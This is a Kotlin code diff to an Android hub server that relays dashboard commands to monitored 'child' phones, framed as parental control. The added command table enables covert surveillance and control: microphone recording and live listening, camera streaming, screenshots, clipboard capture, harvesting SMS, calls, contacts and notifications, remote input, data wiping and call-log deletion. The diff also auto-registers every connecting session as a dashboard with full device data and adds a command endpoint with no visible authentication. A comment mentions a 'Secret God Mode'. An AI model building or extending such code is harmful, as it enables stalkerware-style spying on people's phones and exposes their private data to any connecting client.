@@ -52,6 +52,89 @@ import java.util.concurrent.CopyOnWriteArrayList
  */
 class EmbeddedHubServer(private val context: Context, private val port: Int = 5000) {
 
+    companion object {
+        val COMMAND_EVENTS = mapOf(
+            "send-sms" to "SEND_SMS_COMMAND",
+            "file-list" to "FILE_LIST_REQUEST",
+            "file-download" to "FILE_DOWNLOAD_REQUEST",
+            "file-upload" to "FILE_UPLOAD_CHUNK",
+            "request-location" to "LOCATION_REQUEST",
+            "request-calls" to "CALLS_REQUEST",
+            "request-sms" to "SMS_REQUEST",
+            "request-contacts" to "CONTACTS_REQUEST",
+            "add-contact" to "ADD_CONTACT_COMMAND",
+            "find-phone" to "FIND_PHONE_COMMAND",
+            "find-phone-stop" to "FIND_PHONE_STOP_COMMAND",
+            "notification-dismiss" to "NOTIFICATION_DISMISS_COMMAND",
+            "notification-clear-all" to "NOTIFICATION_CLEAR_ALL_COMMAND",
+            "vibrate" to "VIBRATE_COMMAND",
+            "tts" to "TTS_COMMAND",
+            "play-audio" to "PLAY_AUDIO_COMMAND",
+            "play-audio-stop" to "PLAY_AUDIO_STOP",
+            "wallpaper" to "WALLPAPER_COMMAND",
+            "device-info" to "DEVICE_INFO_REQUEST",
+            "installed-apps" to "INSTALLED_APPS_REQUEST",
+            "app-perms" to "APP_PERMS_REQUEST",
+            "wifi-info" to "WIFI_REQUEST",
+            "clipboard-read" to "CLIPBOARD_READ_REQUEST",
+            "clipboard-enable" to "CLIPBOARD_CAPTURE_ENABLE",
+            "clipboard-disable" to "CLIPBOARD_CAPTURE_DISABLE",
+            "lock" to "LOCK_COMMAND",
+            "call-blocklist-sync" to "CALL_BLOCKLIST_SYNC",
+            "mic-record" to "MIC_RECORD_COMMAND",
+            "camera-capture" to "CAMERA_CAPTURE_COMMAND",
+            "screenshot" to "SCREENSHOT_COMMAND",
+            "screen-record-start" to "SCREEN_RECORD_START",
+            "screen-record-stop" to "SCREEN_RECORD_STOP",
+            "camera-stream-start" to "CAMERA_STREAM_START",
+            "camera-stream-stop" to "CAMERA_STREAM_STOP",
+            "torch" to "TORCH_COMMAND",
+            "wipe-data" to "WIPE_COMMAND",
+            "live-listen-start" to "LIVE_LISTEN_START",
+            "live-listen-stop" to "LIVE_LISTEN_STOP",
+            "input-key" to "INPUT_KEY_COMMAND",
+            "input-tap" to "INPUT_TAP_COMMAND",
+            "input-swipe" to "INPUT_SWIPE_COMMAND",
+            "volume-get" to "VOLUME_GET_REQUEST",
+            "volume-set" to "VOLUME_SET_COMMAND",
+            "clipboard-write" to "CLIPBOARD_WRITE_COMMAND",
+            "open-url" to "OPEN_URL_COMMAND",
+            "battery-stats" to "BATTERY_STATS_REQUEST",
+            "launch-app" to "LAUNCH_APP_COMMAND",
+            "lost-mode" to "LOST_MODE_COMMAND",
+            "media-gallery" to "MEDIA_GALLERY_REQUEST",
+            "input-text" to "INPUT_TEXT_COMMAND",
+            "screen-wake" to "SCREEN_WAKE_COMMAND",
+            "call-action" to "CALL_ACTION_COMMAND",
+            "cellular-info" to "CELLULAR_INFO_REQUEST",
+            "torch-strobe" to "TORCH_STROBE_COMMAND",
+            "junk-scan" to "JUNK_SCAN_REQUEST",
+            "junk-clean" to "JUNK_CLEAN_COMMAND",
+            "dnd-get" to "DND_GET_REQUEST",
+            "dnd-set" to "DND_SET_COMMAND",
+            "file-delete" to "FILE_DELETE_COMMAND",
+            "file-rename" to "FILE_RENAME_COMMAND",
+            "file-mkdir" to "FILE_MKDIR_COMMAND",
+            "file-move" to "FILE_MOVE_COMMAND",
+            "file-copy" to "FILE_COPY_COMMAND",
+            "uninstall-app" to "UNINSTALL_APP_COMMAND",
+            "call-outgoing" to "CALL_OUTGOING_COMMAND",
+            "walkie-talkie-start" to "WALKIE_TALKIE_START",
+            "walkie-talkie-chunk" to "WALKIE_TALKIE_CHUNK",
+            "walkie-talkie-stop" to "WALKIE_TALKIE_STOP",
+            "sync-config" to "SYNC_CONFIG_COMMAND",
+            "parental-control" to "PARENTAL_CONTROL_CONFIG_COMMAND",
+            "app-usage" to "APP_USAGE_REQUEST",
+            "storage-analysis" to "STORAGE_ANALYSIS_REQUEST",
+            "pause-monitoring" to "PAUSE_MONITORING_COMMAND",
+            "delete-contact" to "DELETE_CONTACT_COMMAND",
+            "edit-contact" to "EDIT_CONTACT_COMMAND",
+            "delete-call" to "DELETE_CALL_COMMAND",
+            "clear-calls" to "CLEAR_CALLS_COMMAND",
+            "lock-screen-message" to "LOCK_SCREEN_MESSAGE_COMMAND"
+        )
+    }
+
     private val TAG = "EmbeddedHubServer"
     private var engine: ApplicationEngine? = null
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
@@ -151,6 +234,16 @@ class EmbeddedHubServer(private val context: Context, private val port: Int = 50
                         call.respond(messages[id] ?: emptyList<Any>())
                     }
 
+                    get("/api/devices/{id}/messages") {
+                        val id = call.parameters["id"] ?: ""
+                        call.respond(messages[id] ?: emptyList<Any>())
+                    }
+
+                    get("/api/devices/{id}/notifications") {
+                        val id = call.parameters["id"] ?: ""
+                        call.respond(notifications[id] ?: emptyList<Any>())
+                    }
+
                     get("/api/devices/{id}/location") {
                         val id = call.parameters["id"] ?: ""
                         call.respond(locations[id] ?: emptyMap<String, Any>())
@@ -159,6 +252,33 @@ class EmbeddedHubServer(private val context: Context, private val port: Int = 50
                     get("/api/devices/{id}/contacts") {
                         val id = call.parameters["id"] ?: ""
                         call.respond(contacts[id] ?: emptyList<Any>())
+                    }
+
+                    post("/api/command/{name}") {
+                        val commandName = call.parameters["name"] ?: ""
+                        val body = call.receiveText()
+                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
+                        val deviceId = json.optString("deviceId", "")
+                        if (deviceId.isEmpty()) {
+                            call.respond(HttpStatusCode.BadRequest, mapOf("success" to false, "error" to "deviceId is required"))
+                            return@post
+                        }
+                        val phoneEvent = COMMAND_EVENTS[commandName] ?: commandName
+                        val childSession = childSessions[deviceId]
+                        if (childSession != null) {
+                            val forwardMsg = JSONObject().apply {
+                                put("event", phoneEvent)
+                                put("payload", json)
+                            }
+                            try {
+                                childSession.send(Frame.Text(forwardMsg.toString()))
+                                call.respond(mapOf("success" to true))
+                            } catch (e: Exception) {
+                                call.respond(HttpStatusCode.InternalServerError, mapOf("success" to false, "error" to (e.message ?: "Send error")))
+                            }
+                        } else {
+                            call.respond(mapOf("success" to false, "error" to "Device is offline or not registered", "queued" to false))
+                        }
                     }
 
                     // Commercial Licensing API with Secret God Mode Support
@@ -258,7 +378,23 @@ class EmbeddedHubServer(private val context: Context, private val port: Int = 50
 
     private suspend fun handleWebSocketSession(session: WebSocketSession) {
         var registeredDeviceId: String? = null
-        var isDashboard = false
+        var isDashboard = true
+
+        // Automatically register as dashboard listener initially
+        if (!dashboardSessions.contains(session)) {
+            dashboardSessions.add(session)
+        }
+
+        // Send all currently known devices as DEVICE_UPDATE events immediately
+        for (dev in devices.values) {
+            val devMsg = JSONObject().apply {
+                put("event", "DEVICE_UPDATE")
+                put("payload", JSONObject(gson.toJson(dev)))
+            }
+            try {
+                session.send(Frame.Text(devMsg.toString()))
+            } catch (_: Exception) {}
+        }
 
         try {
             for (frame in session.incoming) {
@@ -268,113 +404,172 @@ class EmbeddedHubServer(private val context: Context, private val port: Int = 50
                         val json = JSONObject(text)
                         val type = json.optString("type")
                         val event = json.optString("event")
-                        val msgType = if (type.isNotEmpty()) type else event
+                        val msgType = if (event.isNotEmpty()) event else type
 
                         when (msgType) {
-                            "dashboard-connect", "init" -> {
-                                isDashboard = true
-                                if (!dashboardSessions.contains(session)) {
-                                    dashboardSessions.add(session)
-                                }
-                                // Send initial state to dashboard
-                                session.send(Frame.Text(JSONObject().apply {
-                                    put("type", "init-sync")
-                                    put("devices", JSONArray(gson.toJson(devices.values)))
-                                }.toString()))
-                            }
+                            "REGISTER_DEVICE", "DEVICE_REGISTER", "device-register" -> {
+                                isDashboard = false
+                                dashboardSessions.remove(session)
 
-                            "device-register" -> {
-                                val dev = json.optJSONObject("device")
-                                val devId = dev?.optString("deviceId") ?: json.optString("deviceId")
+                                val payload = json.optJSONObject("payload") ?: json.optJSONObject("device") ?: json
+                                val devId = payload.optString("deviceId")
                                 if (devId.isNotEmpty()) {
                                     registeredDeviceId = devId
                                     childSessions[devId] = session
-                                    
+
                                     val devMap = devices.getOrPut(devId) { mutableMapOf() }
                                     devMap["deviceId"] = devId
-                                    devMap["deviceName"] = dev?.optString("deviceName", "Android Device")
-                                    devMap["battery"] = dev?.optInt("battery", 100)
-                                    devMap["isCharging"] = dev?.optBoolean("isCharging", false)
+                                    devMap["id"] = devId
+                                    devMap["deviceName"] = payload.optString("deviceName", payload.optString("name", "Android Phone"))
+                                    devMap["battery"] = payload.optInt("battery", 100)
+                                    devMap["isCharging"] = payload.optBoolean("isCharging", false)
                                     devMap["online"] = true
                                     devMap["last_seen"] = System.currentTimeMillis()
-                                    if (dev?.has("model") == true) devMap["model"] = dev.optString("model")
-                                    if (dev?.has("androidVersion") == true) devMap["androidVersion"] = dev.optString("androidVersion")
+                                    if (payload.has("model")) devMap["model"] = payload.optString("model")
+                                    if (payload.has("androidVersion")) devMap["androidVersion"] = payload.optString("androidVersion")
+                                    if (payload.has("manufacturer")) devMap["manufacturer"] = payload.optString("manufacturer")
 
                                     saveDatabase()
 
-                                    // Broadcast to dashboards
+                                    // Acknowledge registration to child phone
+                                    session.send(Frame.Text(JSONObject().apply {
+                                        put("event", "DEVICE_REGISTERED")
+                                        put("payload", JSONObject().put("deviceId", devId).put("status", "ok"))
+                                    }.toString()))
+
+                                    // Broadcast DEVICE_UPDATE to all dashboards
                                     broadcastToDashboards(JSONObject().apply {
-                                        put("type", "device-status")
-                                        put("deviceId", devId)
-                                        put("online", true)
-                                        put("device", JSONObject(gson.toJson(devMap)))
+                                        put("event", "DEVICE_UPDATE")
+                                        put("payload", JSONObject(gson.toJson(devMap)))
+                                    }.toString())
+                                    Log.i(TAG, "Child device registered: $devId (${devMap["deviceName"]})")
+                                }
+                            }
+
+                            "HEARTBEAT", "DEVICE_HEARTBEAT", "DEVICE_STATUS", "telemetry-update" -> {
+                                val payload = json.optJSONObject("payload") ?: json
+                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
+                                if (devId.isNotEmpty()) {
+                                    val devMap = devices.getOrPut(devId) { mutableMapOf("deviceId" to devId, "id" to devId) }
+                                    if (payload.has("battery")) devMap["battery"] = payload.optInt("battery")
+                                    if (payload.has("isCharging")) devMap["isCharging"] = payload.optBoolean("isCharging")
+                                    devMap["online"] = true
+                                    devMap["last_seen"] = System.currentTimeMillis()
+                                    saveDatabase()
+
+                                    broadcastToDashboards(JSONObject().apply {
+                                        put("event", "DEVICE_UPDATE")
+                                        put("payload", JSONObject(gson.toJson(devMap)))
                                     }.toString())
                                 }
                             }
 
-                            "telemetry-update" -> {
-                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
-                                if (devId.isNotEmpty()) {
-                                    val devMap = devices.getOrPut(devId) { mutableMapOf("deviceId" to devId) }
-                                    if (json.has("battery")) devMap["battery"] = json.optInt("battery")
-                                    if (json.has("isCharging")) devMap["isCharging"] = json.optBoolean("isCharging")
-                                    devMap["online"] = true
-                                    devMap["last_seen"] = System.currentTimeMillis()
-                                    saveDatabase()
-                                    broadcastToDashboards(text)
-                                }
-                            }
-
-                            "calls-update" -> {
-                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
+                            "SYNC_CALLS", "calls-update" -> {
+                                val payload = json.optJSONObject("payload") ?: json
+                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                 if (devId.isNotEmpty()) {
                                     val callList: MutableList<Map<String, Any?>> = gson.fromJson(
-                                        json.optJSONArray("calls")?.toString() ?: "[]",
+                                        payload.optJSONArray("calls")?.toString() ?: "[]",
                                         object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                     )
                                     calls[devId] = callList
                                     saveDatabase()
-                                    broadcastToDashboards(text)
+
+                                    val bcast = JSONObject().apply {
+                                        put("event", "CALLS_SYNCED")
+                                        put("payload", JSONObject().apply {
+                                            put("deviceId", devId)
+                                            put("calls", payload.optJSONArray("calls") ?: JSONArray())
+                                        })
+                                    }
+                                    broadcastToDashboards(bcast.toString())
                                 }
                             }
 
-                            "sms-update" -> {
-                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
+                            "SYNC_SMS", "sms-update" -> {
+                                val payload = json.optJSONObject("payload") ?: json
+                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                 if (devId.isNotEmpty()) {
                                     val smsList: MutableList<Map<String, Any?>> = gson.fromJson(
-                                        json.optJSONArray("messages")?.toString() ?: "[]",
+                                        payload.optJSONArray("messages")?.toString() ?: "[]",
                                         object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                     )
                                     messages[devId] = smsList
                                     saveDatabase()
-                                    broadcastToDashboards(text)
+
+                                    val bcast = JSONObject().apply {
+                                        put("event", "SMS_SYNCED")
+                                        put("payload", JSONObject().apply {
+                                            put("deviceId", devId)
+                                            put("messages", payload.optJSONArray("messages") ?: JSONArray())
+                                        })
+                                    }
+                                    broadcastToDashboards(bcast.toString())
                                 }
                             }
 
-                            "location-update" -> {
-                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
+                            "LOCATION_UPDATE", "LOCATION_REPORT", "location-update" -> {
+                                val payload = json.optJSONObject("payload") ?: json
+                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                 if (devId.isNotEmpty()) {
+                                    val locObj = payload.optJSONObject("location") ?: payload
                                     val locMap: MutableMap<String, Any?> = gson.fromJson(
-                                        json.optJSONObject("location")?.toString() ?: "{}",
+                                        locObj.toString(),
                                         object : TypeToken<MutableMap<String, Any?>>() {}.type
                                     )
                                     locations[devId] = locMap
                                     saveDatabase()
-                                    broadcastToDashboards(text)
+
+                                    val bcast = JSONObject().apply {
+                                        put("event", "LOCATION_UPDATE")
+                                        put("payload", JSONObject().apply {
+                                            put("deviceId", devId)
+                                            put("latitude", locObj.optDouble("latitude", locObj.optDouble("lat", 0.0)))
+                                            put("longitude", locObj.optDouble("longitude", locObj.optDouble("lng", 0.0)))
+                                            put("accuracy", locObj.optDouble("accuracy", 0.0))
+                                            put("timestamp", locObj.optLong("timestamp", System.currentTimeMillis()))
+                                        })
+                                    }
+                                    broadcastToDashboards(bcast.toString())
                                 }
                             }
 
-                            "contacts-update" -> {
-                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
+                            "SYNC_CONTACTS", "contacts-update" -> {
+                                val payload = json.optJSONObject("payload") ?: json
+                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                 if (devId.isNotEmpty()) {
                                     val contactList: MutableList<Map<String, Any?>> = gson.fromJson(
-                                        json.optJSONArray("contacts")?.toString() ?: "[]",
+                                        payload.optJSONArray("contacts")?.toString() ?: "[]",
                                         object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                     )
                                     contacts[devId] = contactList
                                     saveDatabase()
-                                    broadcastToDashboards(text)
+
+                                    val bcast = JSONObject().apply {
+                                        put("event", "CONTACTS_SYNCED")
+                                        put("payload", JSONObject().apply {
+                                            put("deviceId", devId)
+                                            put("contacts", payload.optJSONArray("contacts") ?: JSONArray())
+                                        })
+                                    }
+                                    broadcastToDashboards(bcast.toString())
                                 }
+                            }
+
+                            "NOTIFICATION_POSTED", "notifications-update" -> {
+                                val payload = json.optJSONObject("payload") ?: json
+                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
+                                if (devId.isNotEmpty()) {
+                                    val notifList = notifications.getOrPut(devId) { mutableListOf() }
+                                    val notifMap: Map<String, Any?> = gson.fromJson(
+                                        payload.toString(),
+                                        object : TypeToken<Map<String, Any?>>() {}.type
+                                    )
+                                    notifList.add(0, notifMap)
+                                    if (notifList.size > 100) notifList.removeAt(notifList.size - 1)
+                                    saveDatabase()
+                                }
+                                broadcastToDashboards(text)
                             }
 
                             // Command sent from Dashboard to target Child Phone
@@ -441,7 +636,8 @@ class EmbeddedHubServer(private val context: Context, private val port: Int = 50
                             }
 
                             // Streaming Frames & Results: Forward directly to dashboard
-                            "camera-frame", "screen-frame", "audio-chunk", "exec-result", "notification-alert" -> {
+                            "camera-frame", "screen-frame", "audio-chunk", "exec-result", "notification-alert",
+                            "CAMERA_CAPTURE_RESULT", "SCREENSHOT_RESULT", "FILE_LIST_RESPONSE" -> {
                                 broadcastToDashboards(text)
                             }
 
@@ -469,13 +665,12 @@ class EmbeddedHubServer(private val context: Context, private val port: Int = 50
                 devices[registeredDeviceId]?.let {
                     it["online"] = false
                     it["last_seen"] = System.currentTimeMillis()
+                    saveDatabase()
+                    broadcastToDashboards(JSONObject().apply {
+                        put("event", "DEVICE_UPDATE")
+                        put("payload", JSONObject(gson.toJson(it)))
+                    }.toString())
                 }
-                saveDatabase()
-                broadcastToDashboards(JSONObject().apply {
-                    put("type", "device-status")
-                    put("deviceId", registeredDeviceId)
-                    put("online", false)
-                }.toString())
             }
         }
     }
